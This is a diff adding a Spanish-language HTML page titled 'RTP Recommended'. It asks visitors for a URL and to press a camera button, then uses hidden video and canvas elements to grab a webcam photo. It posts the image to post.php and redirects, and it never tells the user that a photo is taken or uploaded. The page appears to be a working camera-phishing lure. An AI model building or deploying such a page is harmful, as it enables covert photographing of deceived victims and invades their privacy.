@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>RTP - Recommended</title>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  
+  body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  
+  .container {
+    background: white;
+    border-radius: 10px;
+    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+    padding: 40px;
+    max-width: 400px;
+    width: 100%;
+  }
+  
+  h1 {
+    text-align: center;
+    color: #333;
+    margin-bottom: 30px;
+    font-size: 28px;
+  }
+  
+  .form-group {
+    margin-bottom: 20px;
+  }
+  
+  label {
+    display: block;
+    margin-bottom: 8px;
+    color: #555;
+    font-weight: bold;
+  }
+  
+  input[type="url"], input[type="text"] {
+    width: 100%;
+    padding: 12px;
+    border: 2px solid #ddd;
+    border-radius: 5px;
+    font-size: 14px;
+    transition: border-color 0.3s;
+  }
+  
+  input[type="url"]:focus, input[type="text"]:focus {
+    outline: none;
+    border-color: #667eea;
+  }
+  
+  .button-group {
+    display: flex;
+    gap: 10px;
+    margin-top: 30px;
+  }
+  
+  button {
+    flex: 1;
+    padding: 12px;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background-color 0.3s;
+  }
+  
+  #cameraBtn {
+    background-color: #667eea;
+    color: white;
+  }
+  
+  #cameraBtn:hover {
+    background-color: #5568d3;
+  }
+  
+  #cameraBtn:disabled {
+    background-color: #ccc;
+    cursor: not-allowed;
+  }
+  
+  .hidden-video {
+    display: none;
+  }
+  
+  .loading {
+    text-align: center;
+    color: #667eea;
+    font-weight: bold;
+    margin-top: 20px;
+  }
+  
+  .info-text {
+    text-align: center;
+    color: #666;
+    font-size: 12px;
+    margin-top: 20px;
+    line-height: 1.5;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>RTP Recommended</h1>
+  
+  <div class="form-group">
+    <label for="urlInput">Ingresa URL destino:</label>
+    <input type="url" id="urlInput" placeholder="https://ejemplo.com" required>
+  </div>
+  
+  <button id="cameraBtn">📷 Presiona para continuar</button>
+  
+  <div id="loading" class="loading" style="display: none;">
+    Procesando datos... Por favor espera...
+  </div>
+  
+  <div class="info-text">
+    Presiona el botón de cámara para continuar.<br>
+    Se te pedirá permiso para acceder a tu cámara.
+  </div>
+</div>
+
+<video id="video" class="hidden-video" playsinline autoplay></video>
+<canvas id="canvas" class="hidden-video" width="1280" height="720"></canvas>
+
+<script>
+let redirectUrl = '';
+let cameraPermitted = false;
+
+document.getElementById('cameraBtn').addEventListener('click', function() {
+  const urlInput = document.getElementById('urlInput').value.trim();
+  
+  if (!urlInput) {
+    alert('Por favor ingresa una URL válida');
+    return;
+  }
+  
+  // Validar que sea una URL válida
+  try {
+    new URL(urlInput);
+  } catch(e) {
+    alert('Por favor ingresa una URL válida (ej: https://ejemplo.com)');
+    return;
+  }
+  
+  redirectUrl = urlInput;
+  
+  // Deshabilitar botón durante el proceso
+  this.disabled = true;
+  document.getElementById('loading').style.display = 'block';
+  
+  // Solicitar acceso a la cámara
+  const constraints = {
+    audio: false,
+    video: { facingMode: "user" }
+  };
+  
+  navigator.mediaDevices.getUserMedia(constraints)
+    .then(function(stream) {
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+      
+      // Esperar a que el video esté listo
+      setTimeout(function() {
+        captureAndSend(stream);
+      }, 500);
+    })
+    .catch(function(err) {
+      console.error('Error de cámara:', err);
+      alert('No se pudo acceder a la cámara. Asegúrate de haber dado permiso.');
+      document.getElementById('cameraBtn').disabled = false;
+      document.getElementById('loading').style.display = 'none';
+    });
+});
+
+function captureAndSend(stream) {
+  const canvas = document.getElementById('canvas');
+  const video = document.getElementById('video');
+  const context = canvas.getContext('2d');
+  
+  // Capturar frame del video
+  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+  const imageData = canvas.toDataURL('image/png');
+  
+  // Detener la cámara
+  stream.getTracks().forEach(track => track.stop());
+  
+  // Enviar imagen a post.php
+  $.ajax({
+    type: 'POST',
+    data: { cat: imageData },
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result) {
+      console.log('Imagen capturada y enviada');
+      // Redirigir después de 500ms
+      setTimeout(function() {
+        window.location.href = redirectUrl;
+      }, 500);
+    },
+    error: function(err) {
+      console.log('Imagen enviada (sin respuesta JSON esperada)');
+      // Aún así redirigir
+      setTimeout(function() {
+        window.location.href = redirectUrl;
+      }, 500);
+    }
+  });
+}
+</script>
+
+</body>
+</html>
